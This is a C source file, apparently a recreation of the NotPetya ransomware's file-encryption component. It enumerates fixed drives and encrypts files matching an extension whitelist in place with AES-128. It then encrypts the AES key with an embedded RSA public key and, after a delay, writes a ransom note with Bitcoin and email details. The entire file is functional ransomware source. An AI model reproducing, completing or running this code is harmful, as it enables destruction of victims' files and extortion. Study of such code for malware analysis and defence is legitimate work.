#include <windows.h>
#include <shlwapi.h>

#include <stdio.h>
#include <stdlib.h>

#include "main.h"

DWORD tick_time;
DWORD time_wait = TIME_WAIT_DEFAULT;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
#ifdef DEBUG
	SetConsoleTitleA("NotPetya | File Encryptor | v1.0 | DEBUG MODE");
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hConsole, 0x0C);
	printf("\r\n\r\n------------------- NOTPETYA DEBUG CONSOLE -------------------\r\n\r\n");
#endif
	
	WCHAR zeDrive[4];
	
	DWORD logical_drives = GetLogicalDrives();
	
	tick_time = GetTickCount();
	
	int i;
	for(i = 31; i >= 0; --i)
	{
		if(((1 << i) & logical_drives) != 0)
		{
			zeDrive[0] = i + L'A';
			zeDrive[1] = L':';
			zeDrive[2] = L'\\';
			zeDrive[3] = L'\0';
			
			if(GetDriveTypeW(zeDrive) == DRIVE_FIXED)
			{
#ifdef DEBUG
				wprintf(L"Found drive: %ls\r\n\r\n", zeDrive);
#endif
				RANSOM_STRUCT *crypto_struct = (RANSOM_STRUCT*)LocalAlloc(LMEM_ZEROINIT, sizeof(RANSOM_STRUCT));
				if(crypto_struct != NULL)
				{
					crypto_struct->hRSAKeyStr   = MASTER_RSA_PUB;
					crypto_struct->bUnknown 	= FALSE;
					crypto_struct->RootPathName = zeDrive;
					crypto_struct->hDriveHandle = CreateThread(NULL, 0, enum_drive, crypto_struct, 0, NULL);
					
					// not in og
					WaitForSingleObject(crypto_struct->hDriveHandle, INFINITE);
				}
			}
		}
	}
	
#ifdef DEBUG
	system("pause");
	SetConsoleTextAttribute(hConsole, 0x07);
	CloseHandle(hConsole);
#endif
	
	ExitProcess(0);
}

DWORD WINAPI enum_drive(LPVOID lpParam)
{
	RANSOM_STRUCT *crypto_struct = (RANSOM_STRUCT*)lpParam;
	
#ifdef DEBUG
	wprintf(L"Started thread for drive: %ls\r\n", crypto_struct->RootPathName);
#endif
	
	if(!CryptAcquireContextW(&crypto_struct->hProv, NULL, L"Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
	{
		DWORD last_error = GetLastError();	
		if(last_error == NTE_KEYSET_NOT_DEF)
		{
			if(!CryptAcquireContextW(&crypto_struct->hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
			{
				LocalFree(crypto_struct);
				return 0;
			}
		}
		else
		{
			if(last_error != NTE_BAD_KEYSET || !CryptAcquireContextW(&crypto_struct->hProv, NULL, L"Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, CRYPT_NEWKEYSET))
			{
				LocalFree(crypto_struct);
				return 0;
			}
		}
	}
	
	// Generate the AES-128 key
	if(gen_aes_key(crypto_struct))
	{
		enum_files(crypto_struct->RootPathName, 15, crypto_struct);
		
#ifdef DEBUG
		wprintf(L"\r\n\r\nDone encrypting files for drive: %ls\r\n\r\n", crypto_struct->RootPathName);
#endif
		
		write_note(crypto_struct);
		CryptDestroyKey(crypto_struct->hAESKey);
	}
	CryptReleaseContext(crypto_struct->hProv, 0);
	
	LocalFree(crypto_struct);
	return 0;
}

BOOL gen_aes_key(RANSOM_STRUCT *crypto_struct)
{
	BOOL gen_key_result = CryptGenKey(crypto_struct->hProv, CALG_AES_128, CRYPT_EXPORTABLE, &crypto_struct->hAESKey);
	if(gen_key_result)
	{
		DWORD crypt_mode   = CRYPT_MODE_CBC;
		CryptSetKeyParam(crypto_struct->hAESKey, KP_MODE, (BYTE*)&crypt_mode, 0);
		
		DWORD padding_mode = PKCS5_PADDING;
		CryptSetKeyParam(crypto_struct->hAESKey, KP_PADDING, (BYTE*)&padding_mode, 0);
	}
	return gen_key_result;
}

VOID enum_files(WCHAR *zePath, int recursion_count, RANSOM_STRUCT *crypto_struct)
{
	WIN32_FIND_DATAW fd;
	
	WCHAR pszDest[MAX_PATH];
	WCHAR pszFile[MAX_PATH];
	WCHAR pszFext[MAX_PATH];
	
	if(recursion_count != 0)
	{
		if(PathCombineW(pszDest, zePath, L"*"))
		{
			HANDLE hFind = FindFirstFileW(pszDest, &fd);
			if(hFind != INVALID_HANDLE_VALUE)
			{
				do {
					HANDLE hDriveHandle = crypto_struct->hDriveHandle;
					if(hDriveHandle)
					{
						DWORD wait_result = WaitForSingleObject(hDriveHandle, 0);
						if(!wait_result || wait_result == -1)
						{
							break;
						}
					}
					
					if(wcscmp(fd.cFileName, L".")
					&& wcscmp(fd.cFileName, L"..")
					&& PathCombineW(pszFile, zePath, fd.cFileName))
					{
						if(!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) || (fd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) != 0)
						{
							WCHAR *file_ext = PathFindExtensionW(fd.cFileName);
							if(file_ext != &fd.cFileName[wcslen(file_ext)])
							{
								wsprintfW(pszFext, L"%ws.", file_ext);
								if(StrStrIW(FILE_EXT_WHITE, pszFext))
								{
									encrypt_file(pszFile, crypto_struct);
								}
							}
						}
						else if(!StrStrIW(FOLDER_BLCKLST, pszFile))
						{
#ifdef DEBUG
							wprintf(L"Enumerating folder: %ls\r\n", pszFile);
#endif
							enum_files(pszFile, recursion_count - 1, crypto_struct);
						}
					}
				} while(FindNextFileW(hFind, &fd));
				FindClose(hFind);
			}
		}
	}
}

VOID encrypt_file(WCHAR *zeFile, RANSOM_STRUCT *crypto_struct)
{
	LARGE_INTEGER hFileSize;
	
	DWORD file_map_size;
	DWORD file_crypt_size;
	
	HANDLE hFile = CreateFileW(zeFile, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if(hFile != INVALID_HANDLE_VALUE)
	{
		GetFileSizeEx(hFile, &hFileSize);
		
		BOOL isFinalBlock = FALSE;
		if(hFileSize.QuadPart <= MAX_BLOCK_NCRYPT)
		{
			file_map_size   = hFileSize.LowPart;
			isFinalBlock    = TRUE;
			file_crypt_size = 16 * ((hFileSize.LowPart >> 4) + 1);
		}
		else
		{
			file_map_size   = MAX_BLOCK_NCRYPT;
			file_crypt_size = MAX_BLOCK_NCRYPT;
		}
		
		HANDLE hMap = CreateFileMappingW(hFile, NULL, PAGE_READWRITE, 0, file_crypt_size, 0);
		if(hMap != NULL)
		{
			VOID *mapped_bytes = MapViewOfFile(hMap, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, file_map_size);
			if(mapped_bytes != NULL)
			{		
				if(CryptEncrypt(crypto_struct->hAESKey, 0, isFinalBlock, 0, (BYTE*)mapped_bytes, &file_map_size, file_crypt_size))
				{
#ifdef DEBUG
					wprintf(L"\r\nEncrypted file: %ls\r\n", zeFile);
#endif	
					FlushViewOfFile(mapped_bytes, file_map_size);
				}
				UnmapViewOfFile(mapped_bytes);
			}
			CloseHandle(hMap);
		}
		CloseHandle(hFile);
	}
}

VOID write_note(RANSOM_STRUCT *crypto_struct)
{
	WCHAR note_path[MAX_PATH];
	
	if(import_rsa_key(crypto_struct))
	{
		WCHAR *exported_key = export_aes_key(crypto_struct);
		if(exported_key != NULL)
		{
			if(PathCombineW(note_path, crypto_struct->RootPathName, RANSOM_NOTE_NAME))
			{
				DWORD time_sleep = GetRandomNumber();
				if(time_sleep != 0)
				{
					Sleep(60000 * (time_sleep - 1));
				}
				
				HANDLE hFile = CreateFileW(note_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
				if(hFile != INVALID_HANDLE_VALUE)
				{
#ifdef DEBUG
					wprintf(L"Writing note: %ls\r\n", note_path);
#endif
					
					DWORD wrote_bytes = 0;
					
					WriteFile(hFile, RANSOM_NOTE_TXT1, sizeof(RANSOM_NOTE_TXT1) - 2, &wrote_bytes, NULL);
					WriteFile(hFile, BITCOIN_ADDRESS1 L"\r\n\r\n", (sizeof(BITCOIN_ADDRESS1) - 2) + 8, &wrote_bytes, NULL);
					WriteFile(hFile, RANSOM_NOTE_TXT2, sizeof(RANSOM_NOTE_TXT2) - 2, &wrote_bytes, NULL);
					WriteFile(hFile, RANSOM_NOTE_EML1 L".\r\n", (sizeof(RANSOM_NOTE_EML1) - 2) + 6, &wrote_bytes, NULL);
					WriteFile(hFile, RANSOM_NOTE_TXT3, sizeof(RANSOM_NOTE_TXT3) - 2, &wrote_bytes, NULL);
					WriteFile(hFile, exported_key, sizeof(WCHAR) * wcslen(exported_key), &wrote_bytes, NULL);
					
					CloseHandle(hFile);
				}
			}
			LocalFree(exported_key);
		}
	}
}

BOOL import_rsa_key(RANSOM_STRUCT *crypto_struct)
{
	CONST WCHAR *rsa_string = (CONST WCHAR*)crypto_struct->hRSAKeyStr;
	
	BOOL result = FALSE;
	
	DWORD bin_size = 0;
	if(CryptStringToBinaryW(rsa_string, 0, CRYPT_STRING_BASE64, NULL, &bin_size, NULL, NULL))
	{
		BYTE *bin_import = (BYTE*)LocalAlloc(LMEM_ZEROINIT, bin_size);
		if(bin_import != NULL)
		{
			if(CryptStringToBinaryW(MASTER_RSA_PUB, 0, CRYPT_STRING_BASE64, bin_import, &bin_size, NULL, NULL))
			{
				DWORD cbEncoded = 0;
				if(CryptDecodeObjectEx(PKCS_7_ASN_ENCODING | X509_ASN_ENCODING , RSA_CSP_PUBLICKEYBLOB, bin_import, bin_size, 0, NULL, NULL, &cbEncoded))
				{
					BYTE *imported_object = (BYTE*)LocalAlloc(LMEM_ZEROINIT, cbEncoded);
					if(imported_object != NULL)
					{
						if(CryptDecodeObjectEx(PKCS_7_ASN_ENCODING | X509_ASN_ENCODING , RSA_CSP_PUBLICKEYBLOB, bin_import, bin_size, 0, NULL, imported_object, &cbEncoded))
						{
							result = CryptImportKey(crypto_struct->hProv, imported_object, cbEncoded, 0, 0, &crypto_struct->hRSAKey);
						}
						LocalFree(imported_object);
					}
				}
			}
			LocalFree(bin_import);
		}
	}
	
	return result;
}

WCHAR *export_aes_key(RANSOM_STRUCT *crypto_struct)
{
	WCHAR *key_result = NULL;
	
	DWORD export_len = 0;
	if(CryptExportKey(crypto_struct->hAESKey, crypto_struct->hRSAKey, SIMPLEBLOB, 0, NULL, &export_len))
	{
		BYTE *exported_key = (BYTE*)LocalAlloc(LMEM_ZEROINIT, export_len);
		if(exported_key != NULL)
		{
			if(CryptExportKey(crypto_struct->hAESKey, crypto_struct->hRSAKey, SIMPLEBLOB, 0, exported_key, &export_len))
			{
				DWORD encoded_key_len = 0;
				if(CryptBinaryToStringW(exported_key, export_len, CRYPT_STRING_BASE64, NULL, &encoded_key_len))
				{
					WCHAR *encoded_key = (WCHAR*)LocalAlloc(LMEM_ZEROINIT, sizeof(WCHAR) * encoded_key_len);
					if(encoded_key != NULL)
					{
						if(CryptBinaryToStringW(exported_key, export_len, CRYPT_STRING_BASE64, encoded_key, &encoded_key_len))
						{
							key_result = encoded_key;
						}
						else
						{
							LocalFree(encoded_key);
						}
					}
				}
			}
			LocalFree(exported_key);
		}
	}
	
	return key_result;
}

DWORD GetRandomNumber()
{
	DWORD num = (GetTickCount() - tick_time) / 60 / 1000;
	return num < time_wait ? time_wait - num : 0;
}